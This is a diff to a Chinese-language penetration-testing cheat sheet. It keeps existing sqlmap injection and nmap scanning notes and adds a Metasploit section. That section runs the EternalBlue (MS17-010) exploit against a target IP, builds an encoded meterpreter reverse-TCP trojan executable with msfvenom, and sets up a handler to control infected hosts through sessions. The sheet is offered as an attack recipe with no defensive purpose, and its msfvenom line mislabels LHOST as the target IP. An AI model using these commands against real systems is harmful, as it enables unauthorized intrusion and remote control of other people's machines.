@@ -1,4 +1,4 @@
-##### 一、sqlmap
+#### 一、sqlmap
 ```
 linux下安装pip install sqlmap
 sqlmap 四种方法：(如果不确定哪种方法，直接 --techniques BETS)
@@ -35,7 +35,7 @@ cookie注入
 sqlmap -u "目标注入点" --cookie="" --level 4 --dbs --batch --threads 10 --technique E
 ```
 
-##### 二、nmap
+#### 二、nmap
 ```
 活跃主机识别:
 nmap -sT tcp扫描，普通扫描
@@ -55,4 +55,38 @@ amap -bq [目标ip] [端口号]
 
 标准扫描主机开放的端口 : nmap -p -T4 [目标ip]
 汇报端口详细信息	  : nmap -T4 -A -v [目标ip] 服务枚举
+```
+#### 三、MSF框架及使用
+##### 1、msfconsole进入msf
+##### 2、msf如果攻击对方所使用的 条件：
+```
+1、漏洞
+2、攻击载荷（木马、病毒）
+```
+##### 3、命令执行（最基本的）
+```
+use exploit/windows/smb/ms17_010_eternalblue	# 使用Windows的ms17_010永恒之蓝这个漏洞
+show options			 # 显示需要的配置
+set RHOSTS [目标ip]		# 设置目标ip
+run						 # 运行
+```
+##### 4、msf最有用的是用作于内网渗透
+```
+生成exe木马
+msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_tcp LHOST=[目标ip] LPORT=4444 -b "\00" -e x86/shikata_ga_nai -f exe > msf.exe
+
+在msf里建立木马的控制端
+use exploit/multi/hanlder
+建立攻击载荷
+set payload windows/meterpreter/reverse_tcp		# 必须和exe木马里的攻击载荷一样，否则无法监听
+show options		# 查看还有什么需要设置的
+set LHOST [自己主机的ip地址]
+exploit				# 直接进入监听状态
+木马如果启动，就会连接这个主机
+
+background			# 暂时不操作，把木马放入后台
+sessions			# 可以查看所有的木马
+sessions -i 1		# 进入1号主机的控制端
+
+back				# 后退一个
 ```
